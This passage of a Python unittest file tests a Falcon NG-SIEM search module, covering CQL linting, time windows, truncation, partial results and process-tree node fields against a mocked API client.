    def test_check_cql_error_blocks_and_lists_warnings_too(self):
        result = self._search(
            query_string="event_simpleName=ProcessRollup2 | hed(5)",
            hours_back=1,
            check_cql=True,
        )
        self.mock_client.command.assert_not_called()
        self.assertFalse(result["ok"])
        self.assertEqual(
            [(i["rule"], i["severity"]) for i in result["cql_lint"]],
            [("missing_tag_prefix", "error"), ("unknown_function", "warning")],
        )

    def test_check_cql_warnings_accompany_an_api_error(self):
        self.mock_client.command.return_value = {
            "status_code": 400,
            "body": {"errors": [{"message": "Unknown function"}]},
        }
        result = self._search(
            query_string="#event_simpleName=ProcessRollup2 | hed(5)",
            hours_back=1,
            check_cql=True,
        )
        self.assertIn("error", result)
        self.assertEqual([w["match"] for w in result["cql_warnings"]], ["hed("])

    def test_check_cql_off_by_default(self):
        self.mock_client.command.side_effect = [
            {"status_code": 200, "body": {"id": "job-1"}},
            {"status_code": 200, "body": {"done": True, "events": [{"a": 1}]}},
        ]
        with patch("falcon_mcp.modules.ngsiem.asyncio.sleep", new_callable=AsyncMock):
            result = self._search(
                query_string="event_simpleName=ProcessRollup2", start="2025-01-01T00:00:00Z"
            )
        self.assertEqual(result["results"], [{"a": 1}])
        for key in ("ok", "partial", "truncated", "total_rows"):
            self.assertNotIn(key, result)

    @patch("falcon_mcp.modules.ngsiem.time.time", return_value=1_700_000_000.0)
    @patch("falcon_mcp.modules.ngsiem.asyncio.sleep", new_callable=AsyncMock)
    def test_hours_back_sets_window_and_max_rows_truncates(self, _sleep, _time):
        events = [{"n": i} for i in range(250)]
        self.mock_client.command.side_effect = [
            {"status_code": 200, "body": {"id": "job-1"}},
            {"status_code": 200, "body": {"done": True, "events": events}},
        ]

        result = self._search(hours_back=2, check_cql=True, max_rows=100)

        body = self.mock_client.command.call_args_list[0][1]["body"]
        self.assertEqual(body["start"], 1_700_000_000_000 - 2 * 3_600_000)
        self.assertNotIn("end", body)
        self.assertTrue(result["ok"])
        self.assertFalse(result["partial"])
        self.assertTrue(result["truncated"])
        self.assertEqual(result["total_rows"], 250)
        self.assertEqual(len(result["results"]), 100)

    def test_hours_back_counts_back_from_end(self):
        self.mock_client.command.side_effect = [
            {"status_code": 200, "body": {"id": "job-1"}},
            {"status_code": 200, "body": {"done": True, "events": []}},
        ]
        with patch("falcon_mcp.modules.ngsiem.asyncio.sleep", new_callable=AsyncMock):
            self._search(hours_back=1, end="2025-01-01T01:00:00Z")
        body = self.mock_client.command.call_args_list[0][1]["body"]
        self.assertEqual(body["end"] - body["start"], 3_600_000)

    def test_needs_start_or_hours_back(self):
        self.assertIn("error", self._search())
        self.assertIn("error", self._search(start="2025-01-01T00:00:00Z", hours_back=1))
        self.assertIn("error", self._search(start="not a time"))
        self.mock_client.command.assert_not_called()

    @patch("falcon_mcp.modules.ngsiem.POLL_INTERVAL_SECONDS", 5)
    @patch("falcon_mcp.modules.ngsiem.asyncio.sleep", new_callable=AsyncMock)
    def test_time_budget_returns_partial_rows(self, _sleep):
        running = {"status_code": 200, "body": {"done": False, "events": [{"n": 1}, {"n": 2}]}}
        self.mock_client.command.side_effect = [
            {"status_code": 200, "body": {"id": "job-1"}},
            running,
            running,
            {"status_code": 204, "body": {}},
        ]

        result = self._search(hours_back=24, time_budget_seconds=10, max_rows=1)

        operations = [c[1].get("operation") for c in self.mock_client.command_async.call_args_list]
        self.assertEqual(operations[-1], "StopSearchV1")
        self.assertNotIn("error", result)
        self.assertTrue(result["partial"])
        self.assertIn("partial_reason", result)
        self.assertEqual(result["results"], [{"n": 1}])
        self.assertTrue(result["truncated"])
        self.assertEqual(result["total_rows"], 2)

    @patch("falcon_mcp.modules.ngsiem.TIMEOUT_SECONDS", 10)
    @patch("falcon_mcp.modules.ngsiem.POLL_INTERVAL_SECONDS", 5)
    @patch("falcon_mcp.modules.ngsiem.asyncio.sleep", new_callable=AsyncMock)
    def test_without_budget_a_timeout_is_still_an_error(self, _sleep):
        running = {"status_code": 200, "body": {"done": False, "events": [{"n": 1}]}}
        self.mock_client.command.side_effect = [
            {"status_code": 200, "body": {"id": "job-1"}},
            running,
            running,
            {"status_code": 204, "body": {}},
        ]
        result = self._search(start="2025-01-01T00:00:00Z")
        self.assertIn("error", result)
        self.assertNotIn("partial", result)


class TestProcessNodeContract(unittest.TestCase):
    """Process-tree node fields are a stable contract for callers that classify trees."""

    def test_node_field_names_and_sources(self):
        from falcon_mcp.modules.ngsiem import _process_node, _public_node

        node = _public_node(
            _process_node(
                {
                    "@timestamp": 1_700_000_000_000,
                    "TargetProcessId": "111",
                    "ParentProcessId": "222",
                    "RawProcessId": "4321",
                    "ImageFileName": r"\Device\HarddiskVolume3\Windows\System32\cmd.exe",
                    "CommandLine": "cmd.exe /c whoami",
                    "UserName": "alice",
                    "UserSid": "S-1-5-21-1",
                    "SHA256HashData": "ab" * 32,
                    "SignInfoFlags": "8683538",
                    "ProcessStartTime": 1_699_999_999.5,
                }
            )
        )
        self.assertEqual(
            node,
            {
                "process_id": "111",
                "parent_process_id": "222",
                "os_pid": "4321",
                "image": r"\Device\HarddiskVolume3\Windows\System32\cmd.exe",
                "command_line": "cmd.exe /c whoami",
                "user_name": "alice",
                "user_sid": "S-1-5-21-1",
                "sha256": "ab" * 32,
                "signing": {"sign_info_flags": "8683538"},
                "process_start_time": "2023-11-14T22:13:19.500000Z",
                "timestamp": "2023-11-14T22:13:20Z",
                "parent_image": None,
                "source_event": "ProcessRollup2",
                "blocked": False,
            },
        )

    def test_missing_values_are_null_not_absent(self):
        from falcon_mcp.modules.ngsiem import _process_node, _public_node

        node = _public_node(_process_node({"TargetProcessId": "1"}))
        self.assertEqual(
            set(node),
            {
                "process_id", "parent_process_id", "os_pid", "image", "command_line",
                "user_name", "user_sid", "sha256", "signing", "process_start_time",
                "timestamp", "parent_image", "source_event", "blocked",
            },
        )
        self.assertIsNone(node["parent_process_id"])
        self.assertIsNone(node["timestamp"])
        self.assertIsNone(node["signing"])

    def test_signing_holds_only_the_raw_fields_present(self):
        from falcon_mcp.modules.ngsiem import _process_node

        cases = [
            # macOS
            (
                {"SigningId": "com.apple.ps", "CodeSigningFlags": "570495761"},
                {"signing_id": "com.apple.ps", "code_signing_flags": "570495761"},
            ),
            # Windows, with numbers as well as strings
            ({"SignInfoFlags": 8683538}, {"sign_info_flags": "8683538"}),
            # A tenant that fills FileSignInfo
            (
                {"FileSignInfo": "signed", "SignInfoFlags": "1"},
                {"file_sign_info": "signed", "sign_info_flags": "1"},
            ),
            # Linux: none of them; empty strings count as absent
            ({"SigningId": ""}, None),
        ]
        for extra, expected in cases:
            with self.subTest(extra=extra):
                node = _process_node({"TargetProcessId": "1", **extra})
                self.assertEqual(node["signing"], expected)


if __name__ == "__main__":
    unittest.main()
